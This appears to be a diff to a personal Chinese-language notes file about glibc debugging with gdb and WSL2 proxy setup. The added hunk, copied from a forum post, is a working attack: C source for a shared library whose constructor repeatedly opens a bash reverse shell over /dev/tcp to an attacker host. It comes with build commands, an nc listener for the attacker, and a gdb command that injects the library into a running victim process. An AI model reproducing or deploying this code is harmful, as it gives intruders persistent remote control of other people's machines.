@@ -15,6 +15,51 @@ tar xvf glibc-2.38.tar.xz
 directory /usr/src/glibc/glibc-2.38
 可以执行“set print pretty on”命令，这样每行只会显示结构体的一名成员，而且还会根据成员的定义层次进行缩进
 ptype /o pthread
+"""
+callback.c:
+#include <pthread.h>
+#include <stdlib.h>
+#include <unistd.h>
+#define SLEEP 120 /* 反连的休眠时间 */
+#define CBADDR "ip" /* 反连地址 */
+#define CBPORT "4444" /* 反连端口 */
+/* 反弹shell命令 */
+#define CMD "echo 'exec >&/dev/tcp/"CBADDR "/" CBPORT "; exec 0>&1' | /bin/bash"
+void *callback(void *a);
+void *callback(void *a)
+{
+for (;;) {
+system(CMD);
+sleep(SLEEP);
+}
+return NULL;
+}
+__attribute__((constructor))
+void start_callbacks()
+{
+pthread_t tid;
+pthread_attr_t attr;
+if (-1 == pthread_attr_init(&attr)) {
+return;
+}
+if (-1 == pthread_attr_setdetachstate(&attr,
+PTHREAD_CREATE_DETACHED)) {
+return;
+}
+pthread_create(&tid, &attr, callback, NULL);
+}
+cc -O2 -fPIC -o libcallback.so ./callback.c -lpthread -shared
+
+攻击机器上执行如下命令:
+nc -lvp 4444
+
+在受害主机上执行如下命令:
+echo 'print __libc_dlopen_mode("/path/to/libcallback.so", 2)' | gdb -p 3158
+"""
+From:https://forum.butian.net/share/3070
+
+
+
 
 wsl2
 1.windows v2ray客户端开启允许来自局域网的连接。
